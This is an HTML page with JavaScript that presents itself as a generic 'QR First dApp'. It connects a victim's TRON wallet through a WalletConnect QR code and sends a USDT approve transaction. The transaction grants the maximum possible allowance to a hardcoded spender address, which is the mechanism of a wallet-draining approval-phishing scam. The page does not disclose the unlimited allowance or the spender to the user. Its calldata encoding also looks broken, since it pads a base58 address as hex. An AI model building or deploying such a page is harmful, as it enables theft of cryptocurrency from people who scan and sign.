<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>TRON WalletConnect QR First</title>

<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
</head>

<body>

<h2>QR → Connect → Sign Flow</h2>

<button id="connectBtn">Generate QR</button>
<button id="approveBtn" disabled>Send Approve</button>

<div id="qr"></div>
<div id="status"></div>

<script type="module">
import SignClient from "https://unpkg.com/@walletconnect/sign-client@2.11.0/dist/index.es.js";

const PROJECT_ID = "dde98880530be70b65d01a1be59e5fa3";

const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";

const MAX =
"115792089237316195423570985008687907853269984665640564039457584007913129639935";

let client;
let session;
let pendingApproval;

/* INIT */
async function init(){
  client = await SignClient.init({
    projectId: PROJECT_ID,
    metadata: {
      name: "QR First dApp",
      url: "https://example.com"
    }
  });
}

/* QR FIRST CONNECT */
async function connectQR(){

  document.getElementById("status").innerText = "Generating QR...";

  const result = await client.connect({
    requiredNamespaces: {
      tron: {
        methods: ["tron_sendTransaction"],
        chains: ["tron:0"],
        events: []
      }
    }
  });

  const uri = result.uri;
  pendingApproval = result.approval;

  if (!uri) {
    document.getElementById("status").innerText =
      "No QR needed (wallet already connected)";
    session = await pendingApproval();
    document.getElementById("approveBtn").disabled = false;
    return;
  }

  const canvas = document.createElement("canvas");
  await QRCode.toCanvas(canvas, uri, { width: 250 });

  document.getElementById("qr").innerHTML = "";
  document.getElementById("qr").appendChild(canvas);

  document.getElementById("status").innerText =
    "Scan QR in Trust Wallet";

  session = await pendingApproval();

  document.getElementById("status").innerText =
    "Connected → ready to sign";

  document.getElementById("approveBtn").disabled = false;
}

/* APPROVE BUILD */
function buildApprove(){
  const methodId = "095ea7b3";

  const spender = SPENDER.padStart(64,"0");
  const amount = BigInt(MAX).toString(16).padStart(64,"0");

  return "0x" + methodId + spender + amount;
}

/* SEND TX */
async function sendApprove(){

  const owner = session.namespaces.tron.accounts[0].split(":")[2];

  const tx = {
    to: USDT,
    owner_address: owner,
    data: buildApprove(),
    feeLimit: 10000000,
    callValue: 0
  };

  document.getElementById("status").innerText =
    "Waiting wallet confirmation...";

  await client.request({
    topic: session.topic,
    chainId: "tron:0",
    request: {
      method: "tron_sendTransaction",
      params: [tx]
    }
  });

  document.getElementById("status").innerText =
    "Sent / signed in wallet UI";
}

document.getElementById("connectBtn").onclick = connectQR;
document.getElementById("approveBtn").onclick = sendApprove;

init();
</script>

</body>
</html>
